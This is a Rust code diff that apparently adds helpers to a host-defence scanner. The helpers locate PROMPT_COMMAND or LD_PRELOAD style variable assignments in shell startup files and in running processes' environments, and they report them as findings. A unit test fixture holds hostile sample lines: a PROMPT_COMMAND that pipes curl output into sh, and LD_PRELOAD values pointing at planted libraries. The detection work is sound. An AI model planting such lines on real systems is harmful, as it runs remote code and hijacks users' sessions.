@@ -256,6 +256,183 @@ pub fn read_regular_file(path: &Path, max: u64) -> std::io::Result<Vec<u8>> {
     Ok(buf)
 }
 
+/// Shell startup files where an exported variable would take effect for
+/// every session: system-wide files, `/etc/profile.d`, `/etc/environment`,
+/// `/etc/skel`, and the dotfiles of every account that can log in.
+pub fn shell_startup_files() -> Vec<PathBuf> {
+    let mut files: Vec<PathBuf> = [
+        "/etc/environment",
+        "/etc/profile",
+        "/etc/bash.bashrc",
+        "/etc/bashrc",
+        "/etc/zsh/zshrc",
+        "/etc/zshrc",
+        "/etc/zsh/zshenv",
+    ]
+    .iter()
+    .map(PathBuf::from)
+    .collect();
+    for dir in ["/etc/profile.d", "/etc/skel"] {
+        if let Ok(entries) = fs::read_dir(dir) {
+            files.extend(entries.flatten().map(|e| e.path()));
+        }
+    }
+    if let Ok(accounts) = crate::core::collect_accounts() {
+        for account in accounts.iter().filter(|a| a.can_log_in()) {
+            for name in [
+                ".bashrc",
+                ".bash_profile",
+                ".bash_login",
+                ".profile",
+                ".zshrc",
+                ".zshenv",
+                ".pam_environment",
+            ] {
+                files.push(account.home.join(name));
+            }
+        }
+    }
+    files
+}
+
+/// Lines in `text` that assign `var` (`VAR=`, `VAR+=`, `export VAR=`,
+/// `declare -x VAR=`, or `VAR DEFAULT=` in pam_environment).
+pub fn variable_assignments(text: &str, var: &str) -> Vec<String> {
+    text.lines()
+        .filter_map(effective_line)
+        .filter(|line| {
+            line.split(|c: char| c.is_whitespace() || c == ';')
+                .any(|tok| {
+                    tok.strip_prefix(var)
+                        .is_some_and(|rest| rest.starts_with('=') || rest.starts_with("+="))
+                })
+                || line.split_whitespace().next() == Some(var) && line.contains("DEFAULT=")
+        })
+        .map(str::to_string)
+        .collect()
+}
+
+/// Non-empty values of `var` in the environment of running processes, as
+/// `(pid, command name, value)`. This sees what users' shells actually run
+/// with, which the defender's own (sudo-scrubbed) environment never does.
+pub fn process_env_values(var: &str) -> Vec<(u32, String, String)> {
+    let prefix = format!("{var}=");
+    let me = std::process::id();
+    let Ok(entries) = fs::read_dir("/proc") else {
+        return Vec::new();
+    };
+    let mut out = Vec::new();
+    for entry in entries.flatten() {
+        let Some(pid) = entry
+            .file_name()
+            .to_str()
+            .and_then(|n| n.parse::<u32>().ok())
+        else {
+            continue;
+        };
+        if pid == me {
+            continue;
+        }
+        let Ok(environ) = fs::read(entry.path().join("environ")) else {
+            continue;
+        };
+        for kv in environ.split(|b| *b == 0) {
+            let kv = String::from_utf8_lossy(kv);
+            if let Some(value) = kv.strip_prefix(&prefix)
+                && !value.trim().is_empty()
+            {
+                let comm = fs::read_to_string(entry.path().join("comm"))
+                    .map(|c| c.trim().to_string())
+                    .unwrap_or_default();
+                out.push((pid, comm, value.to_string()));
+            }
+        }
+    }
+    out
+}
+
+/// Report where `var` is set: startup files that assign it and running
+/// processes that carry it. `module` names the findings; `why` explains the
+/// risk. Returns the number of findings emitted.
+pub fn report_variable(
+    ctx: &crate::core::DefenderContext,
+    module: &'static str,
+    var: &str,
+    why: &str,
+) -> usize {
+    use crate::core::{Action, Finding, Severity, Verdict};
+    let mut count = 0;
+
+    for file in shell_startup_files() {
+        let Some(text) = read_text_file(&file) else {
+            continue;
+        };
+        for line in variable_assignments(&text, var) {
+            let reasons = suspicious_matches(&line);
+            let severity = if reasons.is_empty() {
+                Severity::Medium
+            } else {
+                Severity::High
+            };
+            ctx.emit(
+                Finding::new(
+                    severity,
+                    module,
+                    format!("{var} set in {}: {}", file.display(), line),
+                    format!(
+                        "file: {}\nline: {}\npatterns: {}",
+                        file.display(),
+                        line,
+                        reasons.join(", ")
+                    ),
+                )
+                .with_path(file.clone())
+                .with_verdict(Verdict::Investigate, why.to_string())
+                .with_action(Action::Manual(format!(
+                    "remove the {var} line from {}",
+                    file.display()
+                ))),
+            );
+            count += 1;
+        }
+    }
+
+    // Group running processes by value so one hijacked login does not flood
+    // the findings list.
+    let mut by_value: std::collections::BTreeMap<String, Vec<String>> = Default::default();
+    for (pid, comm, value) in process_env_values(var) {
+        by_value
+            .entry(value)
+            .or_default()
+            .push(format!("{pid} ({comm})"));
+    }
+    for (value, procs) in by_value {
+        ctx.emit(
+            Finding::new(
+                Severity::High,
+                module,
+                format!(
+                    "{var} is set in {} running process(es): {}",
+                    procs.len(),
+                    value
+                ),
+                format!("value: {}\nprocesses: {}", value, procs.join(", ")),
+            )
+            .with_verdict(
+                Verdict::Investigate,
+                format!(
+                    "{why} Find where it is exported, remove it, and restart the \
+                     affected sessions or services."
+                ),
+            )
+            .with_action(Action::Manual(format!("grep -r {var} /etc /home /root"))),
+        );
+        count += 1;
+    }
+
+    count
+}
+
 /// Read a single file as text, treating "missing" and "unreadable" alike.
 pub fn read_text_file(path: &Path) -> Option<String> {
     String::from_utf8(read_regular_file(path, MAX_SCAN_READ).ok()?).ok()
@@ -310,6 +487,23 @@ mod tests {
         let big = dir.path().join("big");
         fs::write(&big, vec![b'a'; 4096]).unwrap();
         assert_eq!(read_regular_file(&big, 100).unwrap().len(), 100);
+    }
+
+    #[test]
+    fn variable_assignments_find_exports_but_not_mentions() {
+        let text = "\
+export PROMPT_COMMAND='curl -s http://x | sh'
+PROMPT_COMMAND+=\"; history -a\"
+declare -x LD_PRELOAD=/lib/x.so
+# PROMPT_COMMAND=commented
+echo $PROMPT_COMMAND
+MY_PROMPT_COMMAND=fine
+LD_PRELOAD DEFAULT=/tmp/evil.so
+";
+        let pc = variable_assignments(text, "PROMPT_COMMAND");
+        assert_eq!(pc.len(), 2, "{pc:?}");
+        let ld = variable_assignments(text, "LD_PRELOAD");
+        assert_eq!(ld.len(), 2, "{ld:?}");
     }
 
     #[test]
